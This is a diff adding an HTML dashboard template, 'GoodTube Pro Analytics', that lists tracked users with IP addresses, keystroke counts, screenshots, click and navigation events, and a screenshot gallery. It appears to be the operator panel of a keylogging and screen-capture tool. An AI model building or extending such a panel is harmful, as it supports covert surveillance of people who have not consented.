@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GoodTube Pro Analytics Dashboard</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/dashboard.css') }}">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="dashboard-container">
+        <!-- Header -->
+        <header class="dashboard-header">
+            <div class="header-content">
+                <div class="logo">
+                    <i class="fas fa-shield-alt"></i>
+                    <h1>GoodTube Pro Analytics</h1>
+                </div>
+                <div class="header-actions">
+                    <button class="btn btn-primary" onclick="refreshData()">
+                        <i class="fas fa-sync-alt"></i> Refresh
+                    </button>
+                    <button class="btn btn-secondary" onclick="exportData()">
+                        <i class="fas fa-download"></i> Export
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="dashboard-main">
+            <!-- Statistics Cards -->
+            <section class="stats-section">
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-users"></i>
+                        </div>
+                        <div class="stat-content">
+                            <h3 id="totalUsers">0</h3>
+                            <p>Total Users</p>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-clock"></i>
+                        </div>
+                        <div class="stat-content">
+                            <h3 id="activeSessions">0</h3>
+                            <p>Active Sessions (24h)</p>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-chart-line"></i>
+                        </div>
+                        <div class="stat-content">
+                            <h3 id="totalEvents">0</h3>
+                            <p>Total Events</p>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-camera"></i>
+                        </div>
+                        <div class="stat-content">
+                            <h3 id="totalScreenshots">0</h3>
+                            <p>Screenshots</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Navigation Tabs -->
+            <section class="tabs-section">
+                <div class="tabs">
+                    <button class="tab-button active" onclick="showTab('overview')">
+                        <i class="fas fa-tachometer-alt"></i> Overview
+                    </button>
+                    <button class="tab-button" onclick="showTab('users')">
+                        <i class="fas fa-users"></i> Users
+                    </button>
+                    <button class="tab-button" onclick="showTab('events')">
+                        <i class="fas fa-list"></i> Events
+                    </button>
+                    <button class="tab-button" onclick="showTab('screenshots')">
+                        <i class="fas fa-images"></i> Screenshots
+                    </button>
+                </div>
+            </section>
+
+            <!-- Tab Content -->
+            <section class="content-section">
+                <!-- Overview Tab -->
+                <div id="overview-tab" class="tab-content active">
+                    <div class="content-grid">
+                        <div class="content-card">
+                            <h3><i class="fas fa-activity"></i> Recent Activity</h3>
+                            <div id="recentActivity" class="activity-list">
+                                <div class="loading">Loading recent activity...</div>
+                            </div>
+                        </div>
+                        <div class="content-card">
+                            <h3><i class="fas fa-chart-bar"></i> Activity Chart</h3>
+                            <div id="activityChart" class="chart-container">
+                                <canvas id="chartCanvas"></canvas>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Users Tab -->
+                <div id="users-tab" class="tab-content">
+                    <div class="content-card">
+                        <h3><i class="fas fa-users"></i> User Management</h3>
+                        <div class="table-container">
+                            <table id="usersTable" class="data-table">
+                                <thead>
+                                    <tr>
+                                        <th>User ID</th>
+                                        <th>IP Address</th>
+                                        <th>Sessions</th>
+                                        <th>Events</th>
+                                        <th>Keystrokes</th>
+                                        <th>Screenshots</th>
+                                        <th>Last Seen</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td colspan="8" class="loading">Loading users...</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Events Tab -->
+                <div id="events-tab" class="tab-content">
+                    <div class="content-card">
+                        <h3><i class="fas fa-list"></i> Event Stream</h3>
+                        <div class="filters">
+                            <input type="text" id="eventFilter" placeholder="Filter events..." class="filter-input">
+                            <select id="eventTypeFilter" class="filter-select">
+                                <option value="">All Event Types</option>
+                                <option value="keystroke">Keystrokes</option>
+                                <option value="click">Clicks</option>
+                                <option value="navigation">Navigation</option>
+                                <option value="screenshot">Screenshots</option>
+                            </select>
+                        </div>
+                        <div id="eventsContainer" class="events-container">
+                            <div class="loading">Loading events...</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Screenshots Tab -->
+                <div id="screenshots-tab" class="tab-content">
+                    <div class="content-card">
+                        <h3><i class="fas fa-images"></i> Screenshot Gallery</h3>
+                        <div id="screenshotsGallery" class="screenshots-gallery">
+                            <div class="loading">Loading screenshots...</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- User Details Modal -->
+    <div id="userModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-user"></i> User Details</h3>
+                <button class="modal-close" onclick="closeUserModal()">&times;</button>
+            </div>
+            <div class="modal-body" id="userModalBody">
+                <div class="loading">Loading user details...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Screenshot Modal -->
+    <div id="screenshotModal" class="modal">
+        <div class="modal-content screenshot-modal">
+            <div class="modal-header">
+                <h3><i class="fas fa-image"></i> Screenshot</h3>
+                <button class="modal-close" onclick="closeScreenshotModal()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <img id="screenshotImage" src="" alt="Screenshot">
+                <div id="screenshotInfo" class="screenshot-info"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
+</body>
+</html>
+
